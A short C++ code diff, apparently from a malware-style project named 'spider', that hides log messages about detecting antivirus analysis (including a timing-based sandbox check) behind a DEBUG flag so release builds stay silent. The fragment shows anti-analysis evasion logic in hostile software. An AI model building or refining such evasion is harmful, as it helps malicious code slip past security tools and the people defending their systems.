@@ -47,9 +47,9 @@ namespace spider
 	}
       if (isBeingAnalyzed)
 	{
-	  nope::log::Log(Info)
-	      << "We are being analyzed by an anti-virus..."; // TOOD: Put in
-	                                                      // Log(Debug)
+#if defined DEBUG
+	  nope::log::Log(Info) << "We are being analyzed by an anti-virus...";
+#endif
 	  return true;
 	}
 
@@ -64,9 +64,9 @@ namespace spider
               .count() <
           std::chrono::duration_cast<std::chrono::microseconds>(2s).count())
 	{
-	  nope::log::Log(Info)
-	      << "We are being analyzed by an anti-virus..."; // TOOD: Put in
-	                                                      // Log(Debug)
+#if defined DEBUG
+	  nope::log::Log(Info) << "We are being analyzed by an anti-virus...";
+#endif
 	  return true;
 	}
       return false;
